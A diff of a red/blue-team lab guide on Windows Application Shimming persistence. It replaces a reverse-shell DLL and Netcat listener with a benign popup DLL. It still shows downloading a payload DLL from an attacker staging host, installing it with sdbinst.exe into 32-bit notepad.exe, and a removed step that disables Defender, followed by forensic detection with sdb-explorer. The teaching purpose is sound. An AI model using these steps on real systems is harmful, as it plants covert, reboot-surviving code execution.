@@ -1,10 +1,10 @@
-![image](https://github.com/user-attachments/assets/placeholder-header)
+
 
 # SDB-Explorer
 
 # Windows VM
 
-## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a malicious DLL into a trusted Windows process, establishing persistent access — and then use sdb-explorer to forensically expose the hidden attack.
+## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a demonstration DLL into a trusted Windows process, establishing persistent execution — and then use sdb-explorer to forensically expose the hidden attack.
 
 ---
 
@@ -38,94 +38,65 @@ If you want to dive a bit deeper, check the [Windows Application Compatibility D
 
 - In this lab, we simulate a targeted persistence attack using two machines on the same subnet. *The Ubuntu VM acts as the attacker's staging server*, while *the Windows VM represents a compromised corporate endpoint*.
 
-- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction — even if the original intrusion vector is discovered and closed.
+- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction.
 
-- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. This shim silently injects **evil.dll** — a reverse shell payload — into **notepad.exe** every time it is opened by any user on the machine.
+- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. Crucially, modern Windows builds restrict `InjectDll` shims on native 64-bit processes. To bypass this security boundary, adversaries often target the 32-bit versions of legitimate system binaries residing in `C:\Windows\SysWOW64\`.
 
-- **Why notepad.exe?** It is one of the most frequently opened applications on any Windows machine, is fully trusted by the OS and users alike, and, crucially, no security tool expects it to make network connections.
+- In our scenario, the attacker targets the 32-bit **notepad.exe**. For educational and safety purposes, instead of deploying a dangerous reverse shell payload, our injected DLL (**demo.dll**) will execute benign proof-of-concept actions: displaying a warning popup and dropping an execution log to disk.
 
 >[!IMPORTANT]
-> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server. All lab files are located in the **Lab Directory** on each machine.
+> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server.
 
 ---
 
-### Phase 1: Setup and Objective
+### Phase 1: Setup and Objective (Windows)
 
-We have access to a compromised *Windows 11* system. Our goal is to plant a persistent backdoor using the Windows Application Compatibility framework.
+Before starting the simulation, we must initialize our local endpoint. Because this virtual machine reverts to a clean snapshot after each reboot, we need to prepare our workspace and apply least-privilege firewall rules for this session.
 
-- First, open Windows PowerShell and navigate to the **Lab Directory**:
-
-```powershell
-cd Desktop/Labs/SdbExplorerLab
-```
-
-- Examine the Lab Directory. Notice **sdb-explorer.exe** is already here — this is the forensic tool we will use at the very end to investigate the attack we are about to carry out:
+1. Open a **PowerShell** terminal as **Administrator**.
+2. Navigate to the pre-created lab directory and execute the session starter script:
 
 ```powershell
-ls
+cd $env:USERPROFILE\Desktop\Labs\SdbExplorerLab
+.\lab_start.ps1
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase1-ls)
-
-- Type **"clear"** in the terminal and *resize* it to take up less space.
-
->[!IMPORTANT]
-> Before proceeding, ensure that **Windows Defender Real-Time Protection is disabled** on the Windows VM. The reverse shell payload (evil.dll) will otherwise be detected and quarantined, preventing the lab from functioning. This simulates a real-world scenario where the attacker has already disabled endpoint protection, or is operating in an environment without active AV coverage.
-
----
+Once you see the green sign [✓], leave this Administrator terminal open for later steps.
 
 ### Phase 2: Staging the Attack (Ubuntu)
 
-As the attacker, your tools are already pre-staged on the Ubuntu server. You need to make the payload files available for download and set up your listener to catch the incoming reverse shell.
+As the attacker, your tools are pre-staged on the Ubuntu server. You simply need to start a web server to make the payload files available for download to the compromised endpoint.
 
-- Open an **Ubuntu Shell** terminal:
-
-![image](https://github.com/user-attachments/assets/placeholder-phase2-terminal)
-
->[!IMPORTANT]
-> We will use **2 Ubuntu Terminals** throughout this lab. Resize them so they occupy as little screen space as possible.
-
-- *Terminal 1:* Navigate to the **Lab Directory**, note your Ubuntu IP address, and start a Python web server on port 8001 to host your payload files. Minimize this terminal afterwards.
+- Open an Ubuntu Shell terminal:
 
 ```bash
-cd ~/BnB/SdbExplorerLab
+cd ~/BnB/SdbExplorer
 ls -lh
 ip a
 python3 -m http.server 8001
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase2-webserver)
 
 >[!NOTE]
-> Note down your **\<UBUNTU_IP\>** — you will need it multiple times throughout the lab.
->
-> The Lab Directory contains three pre-staged files:
-> - **evil.dll** — a reverse shell payload pre-compiled to call back to this Ubuntu VM's IP on port 4444.
-> - **patch.sdb** — a Shim Database pre-configured to inject `evil.dll` into `notepad.exe` via the `InjectDll` fix.
-> - **sdb-explorer.exe** — the forensic analysis tool.
->
-> These files were generated during lab setup. If your Ubuntu IP ever changes between sessions, `evil.dll` will need to be regenerated because the callback address is baked into the binary at compile time. This is a key characteristic of this type of payload.
+>Note down your <UBUNTU_IP> — you will need it in the next phase.
 
-- *Terminal 2:* Open a second Ubuntu Shell, navigate to the Lab Directory, and start a Netcat listener on port **4444**. This is where the reverse shell will connect when notepad.exe is launched on Windows. **Do NOT minimize this terminal.**
+The Lab Directory contains three pre-staged files:
 
-```bash
-cd ~/BnB/SdbExplorerLab
-nc -lvnp 4444
-```
+* demo.dll — a 32-bit demonstration payload compiled to trigger a visible popup and log execution.
 
-![image](https://github.com/user-attachments/assets/placeholder-phase2-nc)
+* patch.sdb — a Shim Database pre-configured to inject demo.dll into notepad.exe.
 
----
+* sdb-explorer.exe — the forensic analysis tool.
 
 ### Phase 3: Payload Delivery & Shim Installation (Windows)
 
-Back on the compromised Windows machine. We download the attack tools from our Ubuntu server and silently install the Shim.
+- Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.
 
-- In PowerShell, download all three files from the Ubuntu staging server. **Replace \<UBUNTU_IP\> with your actual Ubuntu IP address.**
+- Download all three files. Replace <UBUNTU_IP> with your actual Ubuntu IP address:
 
 ```powershell
-# Download the malicious DLL to a plausible, user-writable location
-Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/evil.dll" -OutFile "C:\Users\Public\evil.dll"
+# Download the benign DLL to a plausible, user-writable location
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/demo.dll" -OutFile "C:\Users\Public\demo.dll"
 
 # Download the Shim Database to a temporary folder
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"
@@ -134,114 +105,71 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\p
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase3-download)
-
-- Now, install the Shim Database using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:
+- Now, install the Shim Database using sdbinst.exe — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:
 
 ```powershell
 sdbinst.exe "$env:TEMP\patch.sdb"
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase3-sdbinst)
-
-You will see a brief confirmation message. Quietly and without any visible indication to the user, the OS has now been instructed to inject `evil.dll` into every future instance of `notepad.exe`.
-
->[!NOTE]
-> **sdbinst.exe requires Administrator privileges.** In a real attack, this means the adversary must have already escalated their privileges before this step — a realistic post-exploitation assumption on a compromised corporate endpoint.
-
----
+You will see a brief confirmation message. Quietly and without any visible indication to regular users, the OS has now been instructed to **inject demo.dll** into every future instance of the 32-bit notepad.exe.
 
 ### Phase 4: Triggering the Persistence
 
-This is the moment of truth. From the perspective of any regular Windows user, the next action is completely innocent.
+This is the moment of truth. To demonstrate that persistence applies system-wide regardless of who launches the application, let's simulate a standard non-technical user.
 
-- Open a **NEW** PowerShell terminal and launch Notepad:
+- Open a NEW, standard PowerShell terminal (WITHOUT Administrator privileges) and launch the 32-bit version of Notepad:
 
 ```powershell
-Start-Process notepad.exe
+Start-Process C:\Windows\SysWOW64\notepad.exe
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase4-notepad)
+- Instantly, a warning Message Box titled "SdbExplorer Lab — Shim Active" will appear on your screen, and an execution log has been secretly dropped to C:\Windows\Temp\shimmed.log.
 
-The Notepad window appears as normal. But underneath the surface, the Windows Application Compatibility Engine read the installed Shim rule, intercepted the process launch, and silently injected **evil.dll** into notepad's memory space. The DLL ran instantly and opened a TCP connection back to the Ubuntu VM on port 4444.
-
-- Switch to your Ubuntu **Terminal 2**. You should see an incoming connection and now have an interactive command shell running inside the notepad.exe process:
-
-```
-Connection from <WINDOWS_IP> <PORT> received!
-Microsoft Windows [Version 10.0.xxxxx]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>
-```
-
-- Run a quick command from the Ubuntu shell to confirm the access:
-
-```bash
-whoami
-hostname
-```
-
-![image](https://github.com/user-attachments/assets/placeholder-phase4-shell)
+Even though a standard user opened a legitimate Windows utility, the Application Compatibility Engine intercepted the process execution and injected the unauthorized payload into Notepad's memory space.
 
 >[!IMPORTANT]
-> Do **NOT** close the Netcat terminal or the Notepad window until the end of the Blue Team detection phase. We will need the active connection and the running process as forensic evidence.
-
----
+>Click OK on the popup, but leave the Notepad window open for the Blue Team detection phase.
 
 ### Phase 5: Blue Team Detection
 
-Time to switch perspective. You are now a security analyst who has received an alert about unusual behavior on this endpoint. You do not yet know what the attacker did — but you are about to find out.
+Time to switch perspective. You are now a security analyst responding to an endpoint behavioral alert. You do not yet know the persistence mechanism used — but you are about to forensically uncover it.
 
-Open a **NEW** PowerShell terminal as **Administrator** and start the investigation.
+Switch back to your Administrator PowerShell terminal.
 
-- **Step 1 — Find the Anomalous Network Connection.** Inspect all established TCP connections enriched with the name of the owning process:
-
-```powershell
-Get-NetTCPConnection -State Established |
-  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
-    @{Name="Process"; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
-  Sort-Object Process
-```
-
-![image](https://github.com/user-attachments/assets/placeholder-phase5-netconn)
-
-Examine the output carefully. You will find a row where **notepad.exe** has an Established connection to an external IP on port **4444**.
-
-**This is the first major red flag.** Notepad is a plain text editor. It has absolutely no legitimate reason to establish network connections of any kind.
-
-- **Step 2 — Identify the Malicious Process.** Take the OwningProcess ID (PID) from the notepad.exe connection and inspect it:
+- Step 1 — Verify Physical Artifact Creation. Attackers often drop log files or temporary data during execution. Let's inspect the anomalous log file generated during the trigger phase:
 
 ```powershell
-Get-Process -Id <PID> | Select-Object Name, Id, Path, StartTime
+Get-Content C:\Windows\Temp\shimmed.log
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase5-process)
+The log text explicitly confirms that a DLL was injected into the current process via Application Shimming.
 
-The path confirms this is a genuine `notepad.exe` — not a renamed binary. So the question becomes: why is it making network connections? Something must have been injected into it.
+- Step 2 — Inspect Running Process Modules. Let's examine the running notepad.exe process to see what dynamic link libraries are currently loaded inside its memory space:
 
-- **Step 3 — Check the AppCompat Registry for Installed Shims.** sdbinst.exe always writes to the registry when it installs a Shim Database. Let's check:
+```powershell
+Get-Process notepad | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*Users\Public*" }
+```
+
+You will clearly see C:\Users\Public\demo.dll loaded inside Notepad. Legitimate Windows system binaries rarely, if ever, load DLLs from public, user-writable directories.
+
+- Step 3 — Check the AppCompat Registry for Installed Shims. sdbinst.exe always records installed database fixes within the Windows Registry. Let's check:
 
 ```powershell
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase5-registry)
+You will see a GUID-based entry referencing an installed .sdb file. Its presence on a standard user endpoint — where IT-managed compatibility shims are rarely deployed — is a major anomaly.
 
-You will see one or more GUID-based entries referencing installed SDB files. Their presence on a standard user workstation — where no IT-managed compatibility fixes should be applied — is a significant anomaly.
-
-- **Step 4 — Locate the SDB File on Disk.** Shims installed by sdbinst.exe are stored in a protected system folder, renamed with a GUID so they are not easily identifiable:
+- Step 4 — Locate the SDB File on Disk. Shims installed by sdbinst.exe are stored in protected system directories, renamed with cryptic GUIDs so they blend in with OS files:
 
 ```powershell
 ls C:\Windows\apppatch\Custom\
 ls C:\Windows\apppatch\Custom64\
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase5-disk)
+You will find a .sdb file matching the registry GUID. This is the attacker's patch.sdb hiding in plain sight.
 
-You will find a `.sdb` file with a cryptic GUID-based filename. This is the attacker's `patch.sdb` hiding in plain sight inside a Windows system directory.
-
-- **Step 5 — Expose the Attack with sdb-explorer.** Native Windows tools cannot easily read the binary contents of an SDB file — this is precisely why these files are such effective hiding spots. Point **sdb-explorer.exe** at the file:
+- Step 5 — Expose the Attack with sdb-explorer. Native Windows utilities cannot easily parse binary SDB files. Point sdb-explorer.exe at the suspicious database file you discovered:
 
 ```powershell
 $sdbFile = (Get-ChildItem C:\Windows\apppatch\Custom\ -Filter "*.sdb" | Select-Object -First 1).FullName
@@ -249,56 +177,45 @@ cd C:\Users\Public
 .\sdb-explorer.exe $sdbFile
 ```
 
-![image](https://github.com/user-attachments/assets/placeholder-phase5-sdbexplorer)
+The tool parses the proprietary binary format and reveals the exact instructions inside:
 
-The tool parses the binary database and displays its contents in a human-readable format. You will see clearly:
+-The targeted executable: notepad.exe
 
-- The **targeted executable**: `notepad.exe`
-- The **fix type applied**: `InjectDll`
-- The **path of the injected payload**: `C:\Users\Public\evil.dll`
+-The fix type applied: InjectDll
 
-**This is the smoking gun.** A Shim instructing Windows to inject an unsigned DLL from a user-writable folder (`C:\Users\Public`) into a core system application is an unambiguous Indicator of Compromise (IoC).
+-The path of the injected payload: C:\Users\Public\demo.dll
 
-**Summary of what we found:**
-- `notepad.exe` was making outbound TCP connections it should never make
-- An illegitimate Shim Database was installed via sdbinst.exe and registered in the system registry
-- The SDB file contained an `InjectDll` rule targeting `notepad.exe` with `C:\Users\Public\evil.dll`
-- This mechanism ensures the backdoor is re-established every time any user opens Notepad — including after a reboot
-
----
+This is the smoking gun. A persistent system rule instructing Windows to silently inject an arbitrary DLL into a core OS utility whenever it runs.
 
 ### Cleanup
 
-You're done! Let's clean up the environment and remove all malicious artifacts.
+Let's clean up the endpoint and remove all lab artifacts.
 
-- **On Ubuntu:** Go to both terminal windows and press **CTRL+C** to terminate the Python server and Netcat listener. Close all Ubuntu terminals.
+- On Ubuntu: Press CTRL+C in the terminal to stop the Python web server.
 
-- **On Windows:** In the Administrator PowerShell, uninstall the Shim Database using the same sdbinst.exe utility:
+- On Windows: In your Administrator PowerShell, uninstall the Shim Database rule:
 
 ```powershell
 sdbinst.exe -u "$env:TEMP\patch.sdb"
 ```
 
-- Remove all dropped files:
+Remove all downloaded payloads and log files:
 
 ```powershell
-Remove-Item "C:\Users\Public\evil.dll" -Force
+Remove-Item "C:\Users\Public\demo.dll" -Force
 Remove-Item "C:\Users\Public\sdb-explorer.exe" -Force
+Remove-Item "C:\Windows\Temp\shimmed.log" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\patch.sdb" -Force
 ```
 
-- Close all terminal windows and close Notepad if it is still open.
-
-- *(Optional)* Delete the SdbExplorerLab folders on both machines to leave no trace.
-
----
+Close Notepad and all active terminal windows.
 
 ### Conclusion
 
-In this lab, you experienced a complete persistence attack cycle built entirely on a legitimate Windows mechanism. An attacker with admin access can silently install a Shim Database using a Microsoft-signed binary, causing a fully trusted application like Notepad to load and execute a malicious DLL — automatically, on every launch, for every user, across reboots — with no further attacker interaction required. As a Blue Teamer, you learned to identify the subtle signs: a text editor making external network connections, suspicious registry entries under AppCompatFlags, and GUID-named binary files hiding in Windows system folders. And with sdb-explorer, you had the right tool to crack those binary files open and expose exactly what the attacker planted inside.
+- In this lab, you experienced a complete persistence attack cycle built entirely on native OS mechanics. 
 
-<br></br>
+- An adversary with administrative privileges can silently install a Shim Database using a trusted, signed Windows utility (sdbinst.exe), causing a benign application like Notepad to execute unauthorized code automatically across reboots. As a Blue Teamer, you learned to identify the subtle forensic footprints: abnormal DLL modules loaded in process memory, suspicious registry modifications under AppCompatFlags, and GUID-named binary files inside Windows system folders. Using sdb-explorer, you successfully parsed the binary database and exposed the exact payload path concealed within.
 
-# Finished?
+### Finished?
 
-[Back to Card's Main Page](/Decks/CORE_v3.1/Persistence/Application_Shimming.md)
+[Back to Card's Main Page]()
